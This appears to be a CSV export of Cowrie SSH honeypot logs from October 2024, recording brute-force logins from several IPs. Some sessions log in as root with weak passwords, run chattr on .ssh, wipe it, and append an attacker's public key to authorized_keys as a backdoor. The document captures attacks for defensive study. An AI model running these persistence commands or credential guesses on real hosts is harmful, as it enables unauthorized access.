eventid,src_ip,src_port,dst_ip,dst_port,session,protocol,version,hassh,hasshAlgorithms,message,sensor,timestamp
cowrie.login.failed,101.91.162.18,,,,423d305990f9,,,,,login attempt [deploy/deploypassword] failed,localhost,2024-10-06T19:46:03.514902Z
cowrie.session.closed,101.91.162.18,,,,423d305990f9,,,,,Connection lost after 1 seconds,localhost,2024-10-06T19:46:04.657459Z
cowrie.session.connect,101.35.252.142,52542,172.233.154.19,2222,4a4b2657c81d,ssh,,,,New connection: 101.35.252.142:52542 (172.233.154.19:2222) [session: 4a4b2657c81d],localhost,2024-10-06T19:46:10.275598Z
cowrie.client.version,101.35.252.142,,,,4a4b2657c81d,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T19:46:10.276160Z
cowrie.client.kex,101.35.252.142,,,,4a4b2657c81d,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T19:46:10.412068Z
cowrie.login.failed,101.35.252.142,,,,4a4b2657c81d,,,,,login attempt [deploy/deploypassword] failed,localhost,2024-10-06T19:46:10.996606Z
cowrie.session.closed,101.35.252.142,,,,4a4b2657c81d,,,,,Connection lost after 1 seconds,localhost,2024-10-06T19:46:12.134816Z
cowrie.session.connect,121.14.12.136,43548,172.233.154.19,2222,5c97e8542d01,ssh,,,,New connection: 121.14.12.136:43548 (172.233.154.19:2222) [session: 5c97e8542d01],localhost,2024-10-06T19:46:14.521000Z
cowrie.client.version,121.14.12.136,,,,5c97e8542d01,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T19:46:14.523344Z
cowrie.client.kex,121.14.12.136,,,,5c97e8542d01,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T19:46:14.679396Z
cowrie.login.failed,121.14.12.136,,,,5c97e8542d01,,,,,login attempt [server/123] failed,localhost,2024-10-06T19:46:15.309149Z
cowrie.session.closed,121.14.12.136,,,,5c97e8542d01,,,,,Connection lost after 1 seconds,localhost,2024-10-06T19:46:16.472260Z
cowrie.session.connect,185.81.30.83,49344,172.233.154.19,2222,d6cac5d8bf20,ssh,,,,New connection: 185.81.30.83:49344 (172.233.154.19:2222) [session: d6cac5d8bf20],localhost,2024-10-06T19:46:32.543922Z
cowrie.client.version,185.81.30.83,,,,d6cac5d8bf20,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T19:46:32.550282Z
cowrie.client.kex,185.81.30.83,,,,d6cac5d8bf20,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T19:46:32.589646Z
cowrie.login.success,185.81.30.83,,,,d6cac5d8bf20,,,,,login attempt [root/rootpassword] succeeded,localhost,2024-10-06T19:46:32.838460Z
cowrie.session.params,185.81.30.83,,,,d6cac5d8bf20,,,,,[],localhost,2024-10-06T19:46:32.939063Z
cowrie.command.input,185.81.30.83,,,,d6cac5d8bf20,,,,,CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh,localhost,2024-10-06T19:46:32.939599Z
cowrie.command.failed,185.81.30.83,,,,d6cac5d8bf20,,,,,Command not found: lockr -ia .ssh,localhost,2024-10-06T19:46:32.940274Z
cowrie.log.closed,185.81.30.83,,,,d6cac5d8bf20,,,,,Closing TTY Log: var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 after 0 seconds,localhost,2024-10-06T19:46:33.066994Z
cowrie.session.params,185.81.30.83,,,,d6cac5d8bf20,,,,,[],localhost,2024-10-06T19:46:33.138050Z
cowrie.command.input,185.81.30.83,,,,d6cac5d8bf20,,,,,"CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",localhost,2024-10-06T19:46:33.138651Z
cowrie.session.file_download,185.81.30.83,,,,d6cac5d8bf20,,,,,Saved redir contents with SHA-256 a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 to var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2,localhost,2024-10-06T19:46:33.181260Z
cowrie.log.closed,185.81.30.83,,,,d6cac5d8bf20,,,,,Closing TTY Log: var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f after 0 seconds,localhost,2024-10-06T19:46:33.182010Z
cowrie.session.connect,185.81.30.83,49348,172.233.154.19,2222,74230dc8f33d,ssh,,,,New connection: 185.81.30.83:49348 (172.233.154.19:2222) [session: 74230dc8f33d],localhost,2024-10-06T19:46:33.228101Z
cowrie.client.version,185.81.30.83,,,,74230dc8f33d,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T19:46:33.228855Z
cowrie.client.kex,185.81.30.83,,,,74230dc8f33d,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T19:46:33.283846Z
cowrie.login.failed,185.81.30.83,,,,74230dc8f33d,,,,,login attempt [345gs5662d34/345gs5662d34] failed,localhost,2024-10-06T19:46:33.508288Z
cowrie.session.closed,185.81.30.83,,,,74230dc8f33d,,,,,Connection lost after 1 seconds,localhost,2024-10-06T19:46:34.568940Z
cowrie.session.connect,185.81.30.83,49364,172.233.154.19,2222,05e1449506a3,ssh,,,,New connection: 185.81.30.83:49364 (172.233.154.19:2222) [session: 05e1449506a3],localhost,2024-10-06T19:46:34.619942Z
cowrie.client.version,185.81.30.83,,,,05e1449506a3,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T19:46:34.620497Z
cowrie.client.kex,185.81.30.83,,,,05e1449506a3,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T19:46:34.667933Z
cowrie.login.success,185.81.30.83,,,,05e1449506a3,,,,,login attempt [root/3245gs5662d34] succeeded,localhost,2024-10-06T19:46:34.878488Z
cowrie.session.closed,185.81.30.83,,,,05e1449506a3,,,,,Connection lost after 0 seconds,localhost,2024-10-06T19:46:34.971496Z
cowrie.session.closed,185.81.30.83,,,,d6cac5d8bf20,,,,,Connection lost after 2 seconds,localhost,2024-10-06T19:46:34.977165Z
cowrie.session.connect,101.91.162.18,56980,172.233.154.19,2222,5a731441371c,ssh,,,,New connection: 101.91.162.18:56980 (172.233.154.19:2222) [session: 5a731441371c],localhost,2024-10-06T19:46:54.767781Z
cowrie.client.version,101.91.162.18,,,,5a731441371c,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T19:46:54.768499Z
cowrie.client.kex,101.91.162.18,,,,5a731441371c,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T19:46:54.911083Z
cowrie.login.failed,101.91.162.18,,,,5a731441371c,,,,,login attempt [adminadmin/password] failed,localhost,2024-10-06T19:46:55.523256Z
cowrie.session.closed,101.91.162.18,,,,5a731441371c,,,,,Connection lost after 1 seconds,localhost,2024-10-06T19:46:56.694585Z
cowrie.session.connect,101.35.252.142,36996,172.233.154.19,2222,b762d09533db,ssh,,,,New connection: 101.35.252.142:36996 (172.233.154.19:2222) [session: b762d09533db],localhost,2024-10-06T19:47:03.434231Z
cowrie.client.version,101.35.252.142,,,,b762d09533db,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T19:47:03.434810Z
cowrie.client.kex,101.35.252.142,,,,b762d09533db,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T19:47:03.570731Z
cowrie.login.success,101.35.252.142,,,,b762d09533db,,,,,login attempt [root/1QAZxsw2!@] succeeded,localhost,2024-10-06T19:47:04.153405Z
cowrie.session.params,101.35.252.142,,,,b762d09533db,,,,,[],localhost,2024-10-06T19:47:04.439729Z
cowrie.command.input,101.35.252.142,,,,b762d09533db,,,,,CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh,localhost,2024-10-06T19:47:04.440159Z
cowrie.command.failed,101.35.252.142,,,,b762d09533db,,,,,Command not found: lockr -ia .ssh,localhost,2024-10-06T19:47:04.440994Z
cowrie.log.closed,101.35.252.142,,,,b762d09533db,,,,,Closing TTY Log: var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 after 0 seconds,localhost,2024-10-06T19:47:04.752412Z
cowrie.session.params,101.35.252.142,,,,b762d09533db,,,,,[],localhost,2024-10-06T19:47:04.909177Z
cowrie.command.input,101.35.252.142,,,,b762d09533db,,,,,"CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",localhost,2024-10-06T19:47:04.909522Z
cowrie.session.file_download,101.35.252.142,,,,b762d09533db,,,,,Saved redir contents with SHA-256 a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 to var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2,localhost,2024-10-06T19:47:05.047176Z
cowrie.log.closed,101.35.252.142,,,,b762d09533db,,,,,Closing TTY Log: var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f after 0 seconds,localhost,2024-10-06T19:47:05.047608Z
cowrie.session.connect,101.35.252.142,37484,172.233.154.19,2222,1b9e15e6702d,ssh,,,,New connection: 101.35.252.142:37484 (172.233.154.19:2222) [session: 1b9e15e6702d],localhost,2024-10-06T19:47:05.182483Z
cowrie.client.version,101.35.252.142,,,,1b9e15e6702d,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T19:47:05.183162Z
cowrie.client.kex,101.35.252.142,,,,1b9e15e6702d,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T19:47:05.319126Z
cowrie.login.failed,101.35.252.142,,,,1b9e15e6702d,,,,,login attempt [345gs5662d34/345gs5662d34] failed,localhost,2024-10-06T19:47:05.904176Z
cowrie.session.closed,101.35.252.142,,,,1b9e15e6702d,,,,,Connection lost after 1 seconds,localhost,2024-10-06T19:47:07.042345Z
cowrie.session.connect,122.3.192.83,1856,172.233.154.19,2222,0ecec0c09eb4,ssh,,,,New connection: 122.3.192.83:1856 (172.233.154.19:2222) [session: 0ecec0c09eb4],localhost,2024-10-06T19:47:07.168241Z
cowrie.client.version,122.3.192.83,,,,0ecec0c09eb4,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T19:47:07.168734Z
cowrie.session.connect,101.35.252.142,38048,172.233.154.19,2222,baabf22f200c,ssh,,,,New connection: 101.35.252.142:38048 (172.233.154.19:2222) [session: baabf22f200c],localhost,2024-10-06T19:47:07.173314Z
cowrie.client.version,101.35.252.142,,,,baabf22f200c,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T19:47:07.173784Z
cowrie.session.connect,121.14.12.136,55978,172.233.154.19,2222,d6d23c4b6cfc,ssh,,,,New connection: 121.14.12.136:55978 (172.233.154.19:2222) [session: d6d23c4b6cfc],localhost,2024-10-06T19:47:07.264651Z
cowrie.client.version,121.14.12.136,,,,d6d23c4b6cfc,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T19:47:07.271016Z
cowrie.client.kex,101.35.252.142,,,,baabf22f200c,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T19:47:07.307509Z
cowrie.client.kex,122.3.192.83,,,,0ecec0c09eb4,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T19:47:07.342734Z
cowrie.client.kex,121.14.12.136,,,,d6d23c4b6cfc,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T19:47:07.427832Z
cowrie.login.success,101.35.252.142,,,,baabf22f200c,,,,,login attempt [root/3245gs5662d34] succeeded,localhost,2024-10-06T19:47:07.881926Z
cowrie.session.closed,101.35.252.142,,,,baabf22f200c,,,,,Connection lost after 0 seconds,localhost,2024-10-06T19:47:08.016637Z
cowrie.session.closed,101.35.252.142,,,,b762d09533db,,,,,Connection lost after 4 seconds,localhost,2024-10-06T19:47:08.017969Z
cowrie.login.failed,121.14.12.136,,,,d6d23c4b6cfc,,,,,login attempt [admin/aa12345678] failed,localhost,2024-10-06T19:47:08.063812Z
cowrie.login.failed,122.3.192.83,,,,0ecec0c09eb4,,,,,login attempt [testuser/test@123] failed,localhost,2024-10-06T19:47:08.080586Z
cowrie.session.closed,121.14.12.136,,,,d6d23c4b6cfc,,,,,Connection lost after 1 seconds,localhost,2024-10-06T19:47:09.228312Z
cowrie.session.closed,122.3.192.83,,,,0ecec0c09eb4,,,,,Connection lost after 2 seconds,localhost,2024-10-06T19:47:09.256614Z
cowrie.session.connect,185.81.30.83,47722,172.233.154.19,2222,806f918a74f1,ssh,,,,New connection: 185.81.30.83:47722 (172.233.154.19:2222) [session: 806f918a74f1],localhost,2024-10-06T19:47:15.593652Z
cowrie.client.version,185.81.30.83,,,,806f918a74f1,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T19:47:15.627666Z
cowrie.client.kex,185.81.30.83,,,,806f918a74f1,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T19:47:15.678018Z
cowrie.login.failed,185.81.30.83,,,,806f918a74f1,,,,,login attempt [user/admin] failed,localhost,2024-10-06T19:47:15.925961Z
cowrie.session.closed,185.81.30.83,,,,806f918a74f1,,,,,Connection lost after 1 seconds,localhost,2024-10-06T19:47:16.974580Z
cowrie.session.connect,14.225.210.238,36652,172.233.154.19,2222,7aab28f777db,ssh,,,,New connection: 14.225.210.238:36652 (172.233.154.19:2222) [session: 7aab28f777db],localhost,2024-10-06T19:47:28.249048Z
cowrie.client.version,14.225.210.238,,,,7aab28f777db,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T19:47:28.249614Z
cowrie.client.kex,14.225.210.238,,,,7aab28f777db,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T19:47:28.448805Z
cowrie.login.failed,14.225.210.238,,,,7aab28f777db,,,,,login attempt [deploy/102030] failed,localhost,2024-10-06T19:47:29.286500Z
cowrie.session.closed,14.225.210.238,,,,7aab28f777db,,,,,Connection lost after 2 seconds,localhost,2024-10-06T19:47:30.489244Z
cowrie.session.connect,101.91.162.18,41290,172.233.154.19,2222,525abf51ba73,ssh,,,,New connection: 101.91.162.18:41290 (172.233.154.19:2222) [session: 525abf51ba73],localhost,2024-10-06T19:47:40.477771Z
cowrie.client.version,101.91.162.18,,,,525abf51ba73,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T19:47:40.482082Z
cowrie.client.kex,101.91.162.18,,,,525abf51ba73,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-10-06T19:47:40.621838Z
cowrie.login.failed,101.91.162.18,,,,525abf51ba73,,,,,login attempt [testuser/test@123] failed,localhost,2024-10-06T19:47:41.192312Z
cowrie.session.closed,101.91.162.18,,,,525abf51ba73,,,,,Connection lost after 1 seconds,localhost,2024-10-06T19:47:42.338792Z
cowrie.session.connect,101.35.252.142,49682,172.233.154.19,2222,825eb81b0b99,ssh,,,,New connection: 101.35.252.142:49682 (172.233.154.19:2222) [session: 825eb81b0b99],localhost,2024-10-06T19:47:52.536949Z
cowrie.client.version,101.35.252.142,,,,825eb81b0b99,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-10-06T19:47:52.537684Z
